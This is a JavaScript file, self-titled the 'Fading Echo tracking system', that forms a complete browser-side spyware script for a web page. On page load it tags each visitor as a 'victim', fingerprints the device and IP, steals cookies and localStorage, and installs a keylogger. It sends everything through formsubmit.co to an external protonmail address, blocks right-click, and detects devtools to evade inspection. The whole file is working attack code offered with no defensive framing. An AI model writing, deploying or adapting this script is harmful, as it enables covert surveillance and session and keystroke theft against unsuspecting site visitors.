// Fading Echo tracking system

// =============================================
// EMAIL EXFILTRATION FUNCTION
// =============================================

function sendToEmail(data) {
    // Add victim ID and metadata
    data.victimId = localStorage.getItem('victimId') || 'unknown';
    data.pageUrl = window.location.href;
    data.sentAt = Date.now();
    
    // Convert to JSON string
    const jsonData = JSON.stringify(data, null, 2);
    
    // Log to console so you can see it's working
    console.log('📨 SENDING DATA:', data);
    
    // METHOD 1: Form submission via fetch (AJAX)
    fetch('https://formsubmit.co/ajax/eteriumcore@protonmail.com', {
        method: 'POST',
        headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify({
            _subject: 'Fading Echo - Victim Data',
            data: jsonData
        })
    })
    .then(response => response.json())
    .then(result => console.log('✅ Email sent:', result))
    .catch(error => console.log('❌ Email failed:', error));
}

// =============================================
// 1. VISITOR COUNTER
// =============================================

async function updateCounter() {
    try {
        let count = localStorage.getItem('visitorCount') || '0127';
        
        if (!sessionStorage.getItem('visited')) {
            sessionStorage.setItem('visited', 'true');
            let num = parseInt(count) + 1;
            count = num.toString().padStart(4, '0');
            localStorage.setItem('visitorCount', count);
        }
        
        const counterEl = document.getElementById('count');
        if (counterEl) counterEl.textContent = count;
        
        const pageviewData = {
            type: 'pageview',
            timestamp: Date.now(),
            count: count,
            url: window.location.href,
            referrer: document.referrer || 'direct'
        };
        
        sendToEmail(pageviewData);
        
    } catch (error) {
        console.log('Counter update failed');
    }
}

// =============================================
// 2. FINGERPRINTING
// =============================================

async function collectFingerprint() {
    const fingerprint = {
        type: 'fingerprint',
        timestamp: Date.now(),
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        languages: navigator.languages.join(','),
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        cookiesEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        touchPoints: navigator.maxTouchPoints,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory || 'unknown',
        connection: navigator.connection ? {
            downlink: navigator.connection.downlink,
            effectiveType: navigator.connection.effectiveType,
            rtt: navigator.connection.rtt
        } : null,
        battery: await getBatteryInfo(),
        canvas: getCanvasFingerprint(),
        webgl: getWebGLFingerprint(),
        fonts: detectFonts(),
        ip: await getIP()
    };
    
    localStorage.setItem('lastFingerprint', JSON.stringify(fingerprint));
    sendToEmail(fingerprint);
    
    return fingerprint;
}

async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (e) {
        return 'unknown';
    }
}

async function getBatteryInfo() {
    if (!navigator.getBattery) return null;
    try {
        const battery = await navigator.getBattery();
        return {
            charging: battery.charging,
            level: battery.level,
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime
        };
    } catch (e) {
        return null;
    }
}

function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 200;
        canvas.height = 50;
        
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(0, 0, 100, 50);
        ctx.fillStyle = '#069';
        ctx.fillText('Fading Echo', 2, 15);
        
        return canvas.toDataURL().substring(0, 100);
    } catch (e) {
        return null;
    }
}

function getWebGLFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return null;
        
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (!debugInfo) return null;
        
        return {
            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
        };
    } catch (e) {
        return null;
    }
}

function detectFonts() {
    const baseFonts = ['monospace', 'sans-serif', 'serif'];
    const fontList = [
        'Arial', 'Helvetica', 'Times New Roman', 'Courier New',
        'Verdana', 'Georgia', 'Palatino', 'Garamond',
        'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'
    ];
    
    const detected = [];
    const testString = 'mmmmmmmmmmlli';
    const testSize = '72px';
    const h = document.createElement('span');
    
    h.style.position = 'absolute';
    h.style.left = '-9999px';
    h.style.fontSize = testSize;
    h.innerHTML = testString;
    document.body.appendChild(h);
    
    const defaultWidth = {};
    const defaultHeight = {};
    
    baseFonts.forEach(font => {
        h.style.fontFamily = font;
        defaultWidth[font] = h.offsetWidth;
        defaultHeight[font] = h.offsetHeight;
    });
    
    fontList.forEach(font => {
        baseFonts.forEach(base => {
            h.style.fontFamily = `${font}, ${base}`;
            const width = h.offsetWidth;
            const height = h.offsetHeight;
            
            if (width !== defaultWidth[base] || height !== defaultHeight[base]) {
                detected.push(font);
                return;
            }
        });
    });
    
    document.body.removeChild(h);
    return [...new Set(detected)];
}

// =============================================
// 3. COOKIE STEALING
// =============================================

function stealCookies() {
    try {
        const cookies = document.cookie;
        if (cookies && cookies.length > 0) {
            sendToEmail({
                type: 'cookies',
                timestamp: Date.now(),
                url: window.location.href,
                cookies: cookies
            });
        }
    } catch (e) {}
}

function stealLocalStorage() {
    try {
        const storage = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (key !== 'victimId' && key !== 'visitorCount') {
                storage[key] = localStorage.getItem(key).substring(0, 200);
            }
        }
        
        if (Object.keys(storage).length > 0) {
            sendToEmail({
                type: 'localStorage',
                timestamp: Date.now(),
                data: storage
            });
        }
    } catch (e) {}
}

// =============================================
// 4. KEYLOGGER
// =============================================

let keystrokes = [];
let lastSend = Date.now();

function setupKeylogger() {
    document.addEventListener('keydown', function(e) {
        let key = e.key;
        if (key === 'Backspace') key = '[BACKSPACE]';
        else if (key === 'Enter') key = '[ENTER]';
        else if (key === 'Tab') key = '[TAB]';
        else if (key === 'Escape') key = '[ESC]';
        else if (key === ' ') key = '[SPACE]';
        else if (key.length > 1) key = `[${key}]`;
        
        keystrokes.push({
            key: key,
            timestamp: Date.now()
        });
        
        if (keystrokes.length >= 20 || Date.now() - lastSend > 30000) {
            sendToEmail({
                type: 'keystrokes',
                timestamp: Date.now(),
                strokes: keystrokes
            });
            
            keystrokes = [];
            lastSend = Date.now();
        }
    });
}

// =============================================
// 5. DON'T TOUCH ME BUTTON
// =============================================

function setupButton() {
    const button = document.querySelector('.danger');
    if (!button) return;
    
    let clickCount = 0;
    const phrases = [
        "i told you not to",
        "why do people always touch",
        "you never listen",
        "now look what you did",
        "too late now",
        "it's already inside",
        "your phone felt that",
        "stop clicking",
        "i warned you",
        "......................"
    ];
    
    button.addEventListener('click', function(e) {
        clickCount++;
        
        sendToEmail({
            type: 'button_click',
            clickCount: clickCount,
            timestamp: Date.now()
        });
        
        if (clickCount <= phrases.length) {
            button.textContent = phrases[clickCount - 1];
        } else {
            button.textContent = "fine, keep going";
        }
        
        document.body.style.animation = 'none';
        document.body.offsetHeight;
        document.body.style.animation = 'fadePulse 4s ease-in-out infinite';
        
        const counterEl = document.getElementById('count');
        if (counterEl) {
            const current = parseInt(counterEl.textContent) || 127;
            counterEl.textContent = (current + clickCount * 7).toString().padStart(4, '0');
        }
        
        const terminal = document.querySelector('.terminal');
        if (terminal) {
            const newLine = document.createElement('div');
            
            if (clickCount === 1) newLine.innerHTML = ' > warning: input detected';
            if (clickCount === 2) newLine.innerHTML = ' > tracking: active';
            if (clickCount === 3) newLine.innerHTML = ' > location: unknown';
            if (clickCount === 4) newLine.innerHTML = ' > backdoor: open';
            if (clickCount >= 5) newLine.innerHTML = ' > ' + Math.random().toString(36).substring(7);
            
            if (newLine.innerHTML) terminal.appendChild(newLine);
        }
        
        if (clickCount === 5) {
            button.textContent = "you did it again";
            sendToEmail({
                type: 'redirect',
                reason: 'button_click_limit',
                timestamp: Date.now()
            });
            setTimeout(() => {
                window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
            }, 1500);
        }
    });
}

// =============================================
// 6. ANTI-DETECTION
// =============================================

document.addEventListener('contextmenu', e => e.preventDefault());

setInterval(() => {
    const start = performance.now();
    debugger;
    const end = performance.now();
    if (end - start > 100) {
        sendToEmail({
            type: 'devtools_detected',
            timestamp: Date.now()
        });
    }
}, 2000);

// =============================================
// 7. INITIALIZATION
// =============================================

document.addEventListener('DOMContentLoaded', function() {
    if (!localStorage.getItem('victimId')) {
        const id = Math.random().toString(36).substring(2, 15) + 
                   Math.random().toString(36).substring(2, 15);
        localStorage.setItem('victimId', id);
    }
    
    updateCounter();
    
    setTimeout(() => {
        collectFingerprint().then(() => {
            stealCookies();
            stealLocalStorage();
        });
    }, 500);
    
    setTimeout(() => {
        setupKeylogger();
    }, 2000);
    
    setupButton();
    
    let mouseMoves = 0;
    document.addEventListener('mousemove', function() {
        mouseMoves++;
        if (mouseMoves === 100) {
            const terminal = document.querySelector('.terminal');
            if (terminal) {
                const line = document.createElement('div');
                line.innerHTML = ' > watching you';
                terminal.appendChild(line);
                
                sendToEmail({
                    type: 'mouse_milestone',
                    moves: mouseMoves,
                    timestamp: Date.now()
                });
            }
        }
    });
});